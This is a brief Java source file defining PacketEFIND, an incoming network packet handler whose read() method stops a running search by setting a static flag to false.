package com.redpois0n.packets.in;

import com.redpois0n.Search;

public class PacketEFIND extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Search.running = false;
	}

}
